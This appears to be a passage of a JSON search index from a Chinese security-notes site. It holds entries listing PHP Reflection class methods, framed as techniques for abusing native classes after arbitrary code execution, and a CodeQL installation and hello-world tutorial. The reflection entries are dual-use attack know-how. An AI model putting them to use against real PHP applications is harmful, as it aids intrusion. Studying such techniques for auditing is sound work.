\u65b9\u6cd5\u662f\u5426\u662f\u533f\u540d\u51fd\u6570 (new ReflectionMethod(\"class?\",\"method?\"))->isDeprecated() // \u65b9\u6cd5\u662f\u5426\u5f03\u7528 (new ReflectionMethod(\"class?\",\"method?\"))->isGenerator() // \u65b9\u6cd5\u662f\u5426\u662f\u751f\u6210\u5668\u51fd\u6570 (new ReflectionMethod(\"class?\",\"method?\"))->isInternal() // \u65b9\u6cd5\u662f\u5426\u662f\u5185\u90e8\u51fd\u6570 (new ReflectionMethod(\"class?\",\"method?\"))->isUserDefined() // \u65b9\u6cd5\u662f\u5426\u662f\u7528\u6237\u5b9a\u4e49","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#reflectionclass","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7)","title":"ReflectionClass"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#poc_5","text":"\u5229\u7528\u529f\u80fd\uff1a - \u83b7\u53d6/\u4fee\u6539\u7c7b\u4e2d\u9759\u6001\u5c5e\u6027\u7684\u503c - \u83b7\u53d6\u7c7b\u4e2d\u5c5e\u6027\u7684\u503c - \u5b9e\u4f8b\u5316\u65b0\u7c7b - \u83b7\u53d6\u7c7b\u4fe1\u606f # \u83b7\u53d6/\u4fee\u6539\u7c7b\u4e2d\u9759\u6001\u5c5e\u6027\u7684\u503c (new ReflectionClass(\"class?\"))->getStaticProperties(); # \u83b7\u53d6\u9759\u6001\u5c5e\u6027 (new ReflectionClass(\"class?\"))->getStaticPropertyValue(\"key?\",\"default_value?\"); # \u83b7\u53d6\u6307\u5b9a\u9759\u6001\u5c5e\u6027\u7684\u503c\uff0c\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e\u9ed8\u8ba4\u503c (new ReflectionClass(\"class?\"))->setStaticPropertyValue(\"key?\",\"value?\"); # \u8bbe\u7f6e\u9759\u6001\u5c5e\u6027\u7684\u503c # \u83b7\u53d6\u7c7b\u4e2d\u5c5e\u6027\u7684\u503c (new ReflectionClass(\"class?\"))->getProperties(); # \u83b7\u53d6\u5c5e\u6027 (new ReflectionClass(\"class?\"))->getProperty(\"key?\") # \u83b7\u53d6\u6307\u5b9a\u5c5e\u6027\u7684\u503c # \u5b9e\u4f8b\u5316\u65b0\u7c7b\uff0c # \u6bd4\u5982\u53cd\u5c04 phpinfo \u51fd\u6570 $c = new ReflectionClass('ReflectionFunction'); $iv = $c->newInstance('phpinfo'); $ia = $c->newInstanceArgs(array('phpinfo')); $ie = $c->newInstanceWithoutConstructor(); // \u8c03\u7528\u4e00\u4e2a\u7c7b\u4f46\u4e0d\u8c03\u7528\u5176 __construct \u65b9\u6cd5 # \u83b7\u53d6\u7c7b\u4fe1\u606f (new ReflectionClass(\"class?\"))->export(); // \u5bfc\u51fa\u7c7b (new ReflectionClass(\"class?\"))->getConstant(string $name) // \u83b7\u53d6\u7c7b\u4e2d\u6307\u5b9a\u5e38\u91cf\u503c (new ReflectionClass(\"class?\"))->getConstants(?int $filter = null) // \u83b7\u53d6\u7c7b\u4e2d\u6240\u6709\u5e38\u91cf\u503c (new ReflectionClass(\"class?\"))->getConstructor() // \u83b7\u53d6\u7c7b\u4e2d\u6784\u9020\u65b9\u6cd5(__construct)\u4f5c\u4e3a\u53cd\u5c04\u65b9\u6cd5\u8fd4\u56de (new ReflectionClass(\"class?\"))->getDefaultProperties() // \u83b7\u53d6\u7c7b\u4e2d\u9ed8\u8ba4\u5c5e\u6027 (new ReflectionClass(\"class?\"))->getDocComment() // \u83b7\u53d6\u7c7b\u7684\u6ce8\u91ca (new ReflectionClass(\"class?\"))->getStartLine() // \u83b7\u53d6\u7c7b\u5f00\u59cb\u884c\u53f7 (new ReflectionClass(\"class?\"))->getEndLine() // \u83b7\u53d6\u7c7b\u7ed3\u675f\u884c\u53f7 (new ReflectionClass(\"class?\"))->getExtensionName() // \u83b7\u53d6\u7c7b\u7684\u6269\u5c55\u540d\u79f0 (new ReflectionClass(\"class?\"))->getFileName() // \u83b7\u53d6\u7c7b\u6240\u5728\u7684\u6587\u4ef6\u540d (new ReflectionClass(\"class?\"))->getInterfaceNames() // \u83b7\u53d6\u7c7b\u7684\u63a5\u53e3\u540d\u79f0 (new ReflectionClass(\"class?\"))->getInterfaces() // \u83b7\u53d6\u7c7b\u7684\u63a5\u53e3 (new ReflectionClass(\"class?\"))->getMethod(string $name) // \u83b7\u53d6\u7c7b\u7684\u6307\u5b9a\u65b9\u6cd5\u4f5c\u4e3a\u53cd\u5c04\u65b9\u6cd5\u8fd4\u56de (new ReflectionClass(\"class?\"))->getMethods() // \u83b7\u53d6\u7c7b\u7684\u65b9\u6cd5 (new ReflectionClass(\"class?\"))->getModifiers() // \u83b7\u53d6\u7c7b\u7684\u4fee\u9970\u7b26 (new ReflectionClass(\"class?\"))->getName() // \u83b7\u53d6\u7c7b\u540d\u79f0 (new ReflectionClass(\"class?\"))->getNamespaceName() // \u83b7\u53d6\u7c7b\u6240\u5728\u547d\u540d\u7a7a\u95f4\u540d\u79f0 (new ReflectionClass(\"class?\"))->getParentClass() // \u83b7\u53d6\u7236\u7c7b\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u8fd4\u56de (new ReflectionClass(\"class?\"))->getReflectionConstant() // \u83b7\u53d6\u7c7b\u7684\u6307\u5b9a\u5e38\u91cf\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u5e38\u91cf\u8fd4\u56de (new ReflectionClass(\"class?\"))->getReflectionConstants() // \u83b7\u53d6\u7c7b\u7684\u5e38\u91cf\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u5e38\u91cf\u6570\u7ec4\u8fd4\u56de (new ReflectionClass(\"class?\"))->getShortName() // \u83b7\u53d6\u7c7b\u7684\u77ed\u540d (new ReflectionClass(\"class?\"))->getTraitAliases() // \u83b7\u53d6\u7c7b\u6240\u4f7f\u7528 trait \u522b\u540d\u7684\u6570\u7ec4 (new ReflectionClass(\"class?\"))->getTraitNames() // \u83b7\u53d6\u7c7b\u6240\u4f7f\u7528 traits \u540d\u79f0\u7684\u6570\u7ec4 (new ReflectionClass(\"class?\"))->getTraits() // \u83b7\u53d6\u7c7b\u6240\u4f7f\u7528\u7684 traits (new ReflectionClass(\"class?\"))->hasConstant(string $name) // \u7c7b\u662f\u5426\u6709\u6307\u5b9a\u7684\u5e38\u91cf (new ReflectionClass(\"class?\"))->hasMethod(string $name) // \u7c7b\u662f\u5426\u6709\u6307\u5b9a\u7684\u65b9\u6cd5 (new ReflectionClass(\"class?\"))->implementsInterface(string $interface) // \u7c7b\u662f\u5426\u5b9e\u73b0\u6307\u5b9a\u7684\u63a5\u53e3 (new ReflectionClass(\"class?\"))->inNamespace() // \u7c7b\u662f\u5426\u5728\u547d\u540d\u7a7a\u95f4\u4e2d (new ReflectionClass(\"class?\"))->isAbstract() // \u7c7b\u662f\u5426\u662f\u62bd\u8c61\u7c7b (new ReflectionClass(\"class?\"))->isAnonymous() // \u7c7b\u662f\u5426\u662f\u533f\u540d\u7c7b (new ReflectionClass(\"class?\"))->isCloneable() // \u7c7b\u662f\u5426\u662f\u53ef\u590d\u5236\u7684 (new ReflectionClass(\"class?\"))->isFinal() // \u7c7b\u662f\u5426\u58f0\u660e\u4e3a final (new ReflectionClass(\"class?\"))->isInternal() // \u7c7b\u662f\u5426\u662f\u5185\u90e8\u7684 (new ReflectionClass(\"class?\"))->isIterable() // \u7c7b\u662f\u5426\u662f\u4e00\u4e2a\u8fed\u4ee3\u7c7b (new ReflectionClass(\"class?\"))->isIterateable() // \u7c7b\u662f\u5426\u662f\u53ef\u8fed\u4ee3\u7684 (new ReflectionClass(\"class?\"))->isSubclassOf(string $class) // \u7c7b\u662f\u5426\u662f\u6307\u5b9a\u7c7b\u7684\u5b50\u7c7b (new ReflectionClass(\"class?\"))->isTrait() // \u7c7b\u662f\u5426\u662f trait (new ReflectionClass(\"class?\"))->isUserDefined() // \u7c7b\u662f\u5426\u662f\u7528\u6237\u5b9a\u4e49\u7684","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","text":"--- created: '21/11/01' title: CodeQL\u5b89\u88c5\u4e0e\u4f7f\u7528 tags: - \u4ee3\u7801\u5ba1\u8ba1 - codeql 1.CodeQL\u5b89\u88c5\u4e0e\u4f7f\u7528 # \u4ec0\u4e48\u662fCodeQL # CodeQL\u662f\u4e00\u4e2a\u53ef\u4ee5\u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u7684\u5f15\u64ce, \u5b89\u5168\u4eba\u5458\u53ef\u4ee5\u7528\u5b83\u4f5c\u4e3a\u6316\u6d1e\u7684\u8f85\u52a9\u6216\u8005\u76f4\u63a5\u8fdb\u884c\u6316\u6398\u6f0f\u6d1e,\u8282\u7701\u8fdb\u884c\u91cd\u590d\u64cd\u4f5c\u7684\u7cbe\u529b\u3002 \u5728CodeQL\u4e2d\uff0c\u4ee3\u7801\u88ab\u89e3\u6790\u6210\u6570\u636e\uff0c\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u5b89\u5168\u6f0f\u6d1e\u3001\u9519\u8bef\u548c\u5176\u4ed6\u9519\u8bef\u88ab\u5efa\u6a21\u4e3a\u53ef\u4ee5\u9488\u5bf9\u6570\u636e\u5e93\u6267\u884c\u7684\u67e5\u8be2\u3002\u6211\u4eec\u53ef\u4ee5\u8fd0\u884c\u7531GitHub\u7814\u7a76\u4eba\u5458\u548c\u793e\u533a\u8d21\u732e\u8005\u7f16\u5199\u7684\u6807\u51c6CodeQL\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u7f16\u5199\u81ea\u5df1\u7684\u67e5\u8be2\u4ee5\u7528\u4e8e\u81ea\u5b9a\u4e49\u5206\u6790\u3002\u67e5\u627e\u6f5c\u5728\u9519\u8bef\u7684\u67e5\u8be2\u76f4\u63a5\u5728\u6e90\u6587\u4ef6\u4e2d\u7a81\u51fa\u663e\u793a\u7ed3\u679c\u3002 \u4fdd\u59c6\u7ea7\u5b89\u88c5\u6559\u7a0b # \u867d\u7136\u5b98\u65b9\u63d0\u4f9b\u4e86\u53ef\u4ee5\u8fdb\u884c\u67e5\u8be2\u7684\u7f51\u7ad9\uff0c\u4f46\u662f\u7531\u4e8e\u5b98\u7f51\u5728\u56fd\u5916\u800c\u4e14\u6267\u884c\u901f\u5ea6\u4e0d\u5feb\uff0c\u6216\u8005\u67d0\u4e9b\u8bed\u8a00(\u5982c/c++)\u9700\u8981\u81ea\u5b9a\u4e49\u7f16\u8bd1\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u5b9e\u9645\u4e0a\u5728\u7f51\u7ad9\u662f\u5b8c\u5168\u4e0d\u591f\u4f7f\u7528\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u672c\u5730\u642d\u5efa\u73af\u5883\uff0c\u4ee5\u4e0b\u6b65\u9aa4\u662f\u4e00\u6b65\u6b65\u8fdb\u884c\u7684\u3002 codeql-cli # \u5728\u547d\u4ee4\u884c(cli)\u7684\u73af\u5883\u4e0b\u8fd0\u884ccodeql \u9879\u76ee\u5730\u5740 : github/codeql-cli-binaries \u6253\u5f00\u9879\u76ee\u5730\u5740\u4e4b\u540e\u8fdb\u5165Releases\u5e93\uff0c\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u7684\u538b\u7f29\u5305\u89e3\u538b\u5230\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u5939 codeql # \u5f00\u6e90\u7684codeql\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93 \u9879\u76ee\u5730\u5740: github/codeql \u8fdb\u5165\u5230\u4e0a\u9762\u89e3\u538bcodeql-cli\u7684\u6587\u4ef6\u5939\uff0c\u5e76\u628a\u8be5\u4ed3\u5e93clone\u4e0b\u6765\uff0c\u4fdd\u8bc1codeql-cli\u548ccodeql\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b vscode-codeql # vscode\u7684codeql\u63d2\u4ef6\uff0c\u76f4\u63a5\u5728\u63d2\u4ef6\u5e02\u573a\u5b89\u88c5 \u914d\u7f6e\u73af\u5883\u53d8\u91cf # \u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528codeql-cli\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u8def\u5f84\u653e\u5230PATH\u4e0b\uff0c\u5177\u4f53\u7684\u65b9\u6cd5\u5c31\u4e0d\u591a\u4ecb\u7ecd\u4e86(windows\u4e0b\u5c06\u5176\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0clinux\u4e0b\u4fee\u6539PATH\u53d8\u91cf) \u540c\u65f6\u6211\u4eec\u6700\u597d\u518d\u914d\u7f6e\u4e0bcodeql\u63d2\u4ef6\u7684\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff0c\u6253\u5f00vscode\u7684\u8bbe\u7f6e\uff0c\u641c\u7d22codeql\uff0c\u4fee\u6539Executable Path \u81f3\u6b64\u6211\u4eec\u7684\u73af\u5883\u7b97\u662f\u914d\u7684\u5dee\u4e0d\u591a\u4e86\u3002\u3002\u3002\u4f46\u662f\u5982\u679c\u4f60\u9700\u8981\u7528go\u7684\u8bdd\u8fd8\u9700\u8981\u8fdb\u884c\u989d\u5916\u914d\u7f6e codeql-go # \u5f00\u6e90\u7684codeql-go\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93(\u4e0d\u592a\u660e\u767d\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u653e\u5728codeql\u5e93\u91cc) \u9879\u76ee\u5730\u5740: github/codeql-go \u8fd9\u4e2a\u9879\u76ee\u4e86\u5199\u660e\u4e86\u5b89\u88c5\u65b9\u6cd5\uff0c\u4f46\u662f\u5b58\u5728\u4ee5\u4e0b\u5f0a\u7aef: 1. \u8fd9\u662f\u4e00\u4e2ash\u811a\u672c\uff0c\u610f\u5473\u7740windows\u529e\u6cd5\u4f7f\u7528 2. \u8fd9\u4e2a\u9879\u76ee\u6709\u8fd9\u4e48\u4e00\u6bb5\u8bdd If you want to use the CodeQL extension for Visual Studio Code, import this repository into your VS Code workspace. \u610f\u601d\u662f\u8bf4\u6211\u4eec\u5982\u679c\u9700\u8981\u4f7f\u7528go\u7684\u6807\u51c6\u5e93\u65f6\uff0c\u8fd8\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u5230vscode\u7684workspace\u91cc\uff0c\u975e\u5e38\u9ebb\u70e6 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u5f0a\u7aef\uff0c\u6211\u81ea\u5df1\u6363\u9f13\u4e86\u4e00\u4e0b\uff0c\u5c06\u5176\u653e\u5728\u4e86codeql\u6807\u51c6\u5e93\u91cc\uff0c\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b 1. clone\u4ed3\u5e93\u5230ql\u6587\u4ef6\u5939\u91cc(\u5373codeql\u6807\u51c6\u5e93)\u5e76\u6539\u5176\u6587\u4ef6\u5939\u540d\u4e3ago \u4fee\u6539.codeqlmanifest.json\uff0c\u52a0\u5165\u4e00\u884c \"go/.codeqlmanifest.json\", { \"provide\" : [ \"ruby/.codeqlmanifest.json\" , \"go/.codeqlmanifest.json\" , \"*/ql/src/qlpack.yml\" , \"*/ql/lib/qlpack.yml\" , \"*/ql/test/qlpack.yml\" , \"cpp/ql/test/query-tests/Security/CWE/CWE-190/semmle/tainted/qlpack.yml\" , \"*/ql/examples/qlpack.yml\" , \"*/upgrades/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/lib/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/src/qlpack.yml\" , \"misc/legacy-support/*/qlpack.yml\" , \"misc/suite-helpers/qlpack.yml\" ] } \u81f3\u6b64\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u5b89\u88c5\u4e86\u5305\u62ecgo\u5728\u5185\u7684codeql\u6807\u51c6\u5e93\u4ee5\u53cacodeql\u7684cli\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2ademo\u6d4b\u8bd5\u4e00\u4e0b Hello world # \u6211\u4eec\u6765\u521b\u5efa\u4e00\u4e2a\u6211\u4eec\u7684\u5b66\u4e60\u5de5\u4f5c\u533a\u5e76\u8f93\u51fa\u4e00\u4e2acodeql\u7684hello,world\uff0c\u6b65\u9aa4\u5982\u4e0b: \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u8fd9\u91cc\u4ee5codeql_study\u4e3a\u4f8b \u7528vscode\u6253\u5f00\u8be5\u6587\u4ef6\u5939\uff0c\u521b\u5efa\u4e00\u4e2aql\u6587\u4ef6\u5939\uff0c\u5e76\u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u521b\u5efahelloworld.ql\u548cqlpack.yml qlpack.yml\u7684\u5185\u5bb9\u5982\u4e0b name: longlone/codeql-study version: 0.0.1 libraryPathDependencies: codeql-go extractor: go helloworld.ql\u7684\u5185\u5bb9\u5982\u4e0b import go select \"hello world\" \u521b\u5efa\u4e00\u4e2acodeql database\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6307\u5b9a\u4e00\u4e2ago\u9879\u76ee\u4f5c\u4e3a\u5206\u6790\u76ee\u6807 codeql database create ./codeql_database -s D:\\Coding\\golang\\src\\codeql_study --language=go \u4ecevscode\u4e2d\u9009\u62e9codeql_database\u4f5c\u4e3a\u6570\u636e\u5e93 \u53f3\u952ehelloworld.ql\uff0c\u9009\u62e9 CodeQL: Run Query \u5982\u679c\u663e\u793a\u4ee5\u4e0a\u753b\u9762\uff0c\u90a3\u4e48\u6211\u4eec\u6210\u529f\u5c31\u5b89\u88c5\u597d\u4e86\u73af\u5883!","title":"1.CodeQL\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#1codeql\u5b89\u88c5\u4e0e\u4f7f\u7528","text":"","title":"1.CodeQL\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#\u4ec0\u4e48\u662fcodeql","text":"CodeQL\u662f\u4e00\u4e2a\u53ef\u4ee5\u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u7684\u5f15\u64ce, \u5b89\u5168\u4eba\u5458\u53ef\u4ee5\u7528\u5b83\u4f5c\u4e3a\u6316\u6d1e\u7684\u8f85\u52a9\u6216\u8005\u76f4\u63a5\u8fdb\u884c\u6316\u6398\u6f0f\u6d1e,\u8282\u7701\u8fdb\u884c\u91cd\u590d\u64cd\u4f5c\u7684\u7cbe\u529b\u3002 \u5728CodeQL\u4e2d\uff0c\u4ee3\u7801\u88ab\u89e3\u6790\u6210\u6570\u636e\uff0c\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u5b89\u5168\u6f0f\u6d1e\u3001\u9519\u8bef\u548c\u5176\u4ed6\u9519\u8bef\u88ab\u5efa\u6a21\u4e3a\u53ef\u4ee5\u9488\u5bf9\u6570\u636e\u5e93\u6267\u884c\u7684\u67e5\u8be2\u3002\u6211\u4eec\u53ef\u4ee5\u8fd0\u884c\u7531GitHub\u7814\u7a76\u4eba\u5458\u548c\u793e\u533a\u8d21\u732e\u8005\u7f16\u5199\u7684\u6807\u51c6CodeQL\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u7f16\u5199\u81ea\u5df1\u7684\u67e5\u8be2\u4ee5\u7528\u4e8e\u81ea\u5b9a\u4e49\u5206\u6790\u3002\u67e5\u627e\u6f5c\u5728\u9519\u8bef\u7684\u67e5\u8be2\u76f4\u63a5\u5728\u6e90\u6587\u4ef6\u4e2d\u7a81\u51fa\u663e\u793a\u7ed3\u679c\u3002","title":"\u4ec0\u4e48\u662fCodeQL"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#\u4fdd\u59c6\u7ea7\u5b89\u88c5\u6559\u7a0b","text":"\u867d\u7136\u5b98\u65b9\u63d0\u4f9b\u4e86\u53ef\u4ee5\u8fdb\u884c\u67e5\u8be2\u7684\u7f51\u7ad9\uff0c\u4f46\u662f\u7531\u4e8e\u5b98\u7f51\u5728\u56fd\u5916\u800c\u4e14\u6267\u884c\u901f\u5ea6\u4e0d\u5feb\uff0c\u6216\u8005\u67d0\u4e9b\u8bed\u8a00(\u5982c/c++)\u9700\u8981\u81ea\u5b9a\u4e49\u7f16\u8bd1\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u5b9e\u9645\u4e0a\u5728\u7f51\u7ad9\u662f\u5b8c\u5168\u4e0d\u591f\u4f7f\u7528\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u80fd\u672c\u5730\u642d\u5efa\u73af\u5883\uff0c\u4ee5\u4e0b\u6b65\u9aa4\u662f\u4e00\u6b65\u6b65\u8fdb\u884c\u7684\u3002","title":"\u4fdd\u59c6\u7ea7\u5b89\u88c5\u6559\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#codeql-cli","text":"\u5728\u547d\u4ee4\u884c(cli)\u7684\u73af\u5883\u4e0b\u8fd0\u884ccodeql \u9879\u76ee\u5730\u5740 : github/codeql-cli-binaries \u6253\u5f00\u9879\u76ee\u5730\u5740\u4e4b\u540e\u8fdb\u5165Releases\u5e93\uff0c\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u7684\u538b\u7f29\u5305\u89e3\u538b\u5230\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u5939","title":"codeql-cli"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#codeql","text":"\u5f00\u6e90\u7684codeql\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93 \u9879\u76ee\u5730\u5740: github/codeql \u8fdb\u5165\u5230\u4e0a\u9762\u89e3\u538bcodeql-cli\u7684\u6587\u4ef6\u5939\uff0c\u5e76\u628a\u8be5\u4ed3\u5e93clone\u4e0b\u6765\uff0c\u4fdd\u8bc1codeql-cli\u548ccodeql\u5728\u540c\u4e00\u4e2a\u76ee\u5f55\u4e0b","title":"codeql"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#vscode-codeql","text":"vscode\u7684codeql\u63d2\u4ef6\uff0c\u76f4\u63a5\u5728\u63d2\u4ef6\u5e02\u573a\u5b89\u88c5","title":"vscode-codeql"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#\u914d\u7f6e\u73af\u5883\u53d8\u91cf","text":"\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u4f7f\u7528codeql-cli\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u8def\u5f84\u653e\u5230PATH\u4e0b\uff0c\u5177\u4f53\u7684\u65b9\u6cd5\u5c31\u4e0d\u591a\u4ecb\u7ecd\u4e86(windows\u4e0b\u5c06\u5176\u6dfb\u52a0\u5230\u73af\u5883\u53d8\u91cf\u4e2d\uff0clinux\u4e0b\u4fee\u6539PATH\u53d8\u91cf) \u540c\u65f6\u6211\u4eec\u6700\u597d\u518d\u914d\u7f6e\u4e0bcodeql\u63d2\u4ef6\u7684\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff0c\u6253\u5f00vscode\u7684\u8bbe\u7f6e\uff0c\u641c\u7d22codeql\uff0c\u4fee\u6539Executable Path \u81f3\u6b64\u6211\u4eec\u7684\u73af\u5883\u7b97\u662f\u914d\u7684\u5dee\u4e0d\u591a\u4e86\u3002\u3002\u3002\u4f46\u662f\u5982\u679c\u4f60\u9700\u8981\u7528go\u7684\u8bdd\u8fd8\u9700\u8981\u8fdb\u884c\u989d\u5916\u914d\u7f6e","title":"\u914d\u7f6e\u73af\u5883\u53d8\u91cf"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#codeql-go","text":"\u5f00\u6e90\u7684codeql-go\u6807\u51c6\u5e93\u548c\u67e5\u8be2\u5e93(\u4e0d\u592a\u660e\u767d\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u653e\u5728codeql\u5e93\u91cc) \u9879\u76ee\u5730\u5740: github/codeql-go \u8fd9\u4e2a\u9879\u76ee\u4e86\u5199\u660e\u4e86\u5b89\u88c5\u65b9\u6cd5\uff0c\u4f46\u662f\u5b58\u5728\u4ee5\u4e0b\u5f0a\u7aef: 1. \u8fd9\u662f\u4e00\u4e2ash\u811a\u672c\uff0c\u610f\u5473\u7740windows\u529e\u6cd5\u4f7f\u7528 2. \u8fd9\u4e2a\u9879\u76ee\u6709\u8fd9\u4e48\u4e00\u6bb5\u8bdd If you want to use the CodeQL extension for Visual Studio Code, import this repository into your VS Code workspace. \u610f\u601d\u662f\u8bf4\u6211\u4eec\u5982\u679c\u9700\u8981\u4f7f\u7528go\u7684\u6807\u51c6\u5e93\u65f6\uff0c\u8fd8\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u5230vscode\u7684workspace\u91cc\uff0c\u975e\u5e38\u9ebb\u70e6 \u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u5f0a\u7aef\uff0c\u6211\u81ea\u5df1\u6363\u9f13\u4e86\u4e00\u4e0b\uff0c\u5c06\u5176\u653e\u5728\u4e86codeql\u6807\u51c6\u5e93\u91cc\uff0c\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b 1. clone\u4ed3\u5e93\u5230ql\u6587\u4ef6\u5939\u91cc(\u5373codeql\u6807\u51c6\u5e93)\u5e76\u6539\u5176\u6587\u4ef6\u5939\u540d\u4e3ago \u4fee\u6539.codeqlmanifest.json\uff0c\u52a0\u5165\u4e00\u884c \"go/.codeqlmanifest.json\", { \"provide\" : [ \"ruby/.codeqlmanifest.json\" , \"go/.codeqlmanifest.json\" , \"*/ql/src/qlpack.yml\" , \"*/ql/lib/qlpack.yml\" , \"*/ql/test/qlpack.yml\" , \"cpp/ql/test/query-tests/Security/CWE/CWE-190/semmle/tainted/qlpack.yml\" , \"*/ql/examples/qlpack.yml\" , \"*/upgrades/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/lib/qlpack.yml\" , \"javascript/ql/experimental/adaptivethreatmodeling/src/qlpack.yml\" , \"misc/legacy-support/*/qlpack.yml\" , \"misc/suite-helpers/qlpack.yml\" ] } \u81f3\u6b64\u6211\u4eec\u5df2\u7ecf\u6210\u529f\u5b89\u88c5\u4e86\u5305\u62ecgo\u5728\u5185\u7684codeql\u6807\u51c6\u5e93\u4ee5\u53cacodeql\u7684cli\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2ademo\u6d4b\u8bd5\u4e00\u4e0b","title":"codeql-go"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/#hello-world","text":"\u6211\u4eec\u6765\u521b\u5efa\u4e00\u4e2a\u6211\u4eec\u7684\u5b66\u4e60\u5de5\u4f5c\u533a\u5e76\u8f93\u51fa\u4e00\u4e2acodeql\u7684hello,world\uff0c\u6b65\u9aa4\u5982\u4e0b: \u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u8fd9\u91cc\u4ee5codeql_study\u4e3a\u4f8b \u7528vscode\u6253\u5f00\u8be5\u6587\u4ef6\u5939\uff0c\u521b\u5efa\u4e00\u4e2aql\u6587\u4ef6\u5939\uff0c\u5e76\u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u521b\u5efahelloworld.ql\u548cqlpack.yml 